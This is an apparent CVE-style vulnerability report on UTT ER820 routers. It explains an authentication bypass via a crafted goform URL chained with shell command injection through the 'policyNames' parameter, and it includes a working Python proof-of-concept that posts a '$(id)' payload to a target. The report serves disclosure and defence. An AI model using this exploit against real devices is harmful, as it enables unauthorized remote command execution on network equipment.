# CVE Report - Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers 

## Vulnerability Title

Authentication Bypass and Command Injection Vulnerability in UTT ER820 Routers (formPdbUpConfig / updateOneProfilePdb)

## Vulnerability Description

UTT ER820 devices expose the GoAhead `websFormHandler` endpoint `formPdbUpConfig` (handler `sub_44F774`) which calls `updateOneProfilePdb`. This chain can be reached via an authentication bypass, and then abused for command injection. Remote attackers can inject shell commands via the POST parameter `policyNames` (passed as `a2` into `updateOneProfilePdb`, ranges `0x44f7b4-0x44f3f4` / `0x44f7b4-0x44f610`), which is embedded into a `doSystem()` call that executes `wget`.

## POC

```py
import requests
import sys

def exploit(base_url: str):
    url = base_url.rstrip('/') + '/goform/formPdbUpConfig/goform/formWebAuthUserSubmit'
    data = {
        'policyNames': '$(id)',
    }
    requests.post(url, data=data, timeout=5)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print('usage: python poc.py http://target')
        raise SystemExit(1)
    exploit(sys.argv[1])
    print('sent')
```

## Cause Analysis

1. **authentication**: `websSecurityHandler` forwards requests containing `/goform/formWebAuthUserSubmit` or `/goform/formWebAuthOk` directly to `websFormHandler`. A crafted URL like `/goform/formPdbUpConfig/goform/formWebAuthUserSubmit` can bypass authentication to reach the handler that triggers `updateOneProfilePdb`.

2. **command injection**: In `updateOneProfilePdb`, the `policyNames` value is used as `%s` arguments in a `doSystem()` call that builds a shell command: `cd /etc_ro/l7-protocols/ && wget -O SE_%s.xml 'http://%s/policyfile/tftpboot/SE_%s.xml'`. Because the `%s` expansion is not safely escaped/quoted (notably in the `-O SE_%s.xml` part), payloads containing command substitution or metacharacters can execute arbitrary commands.
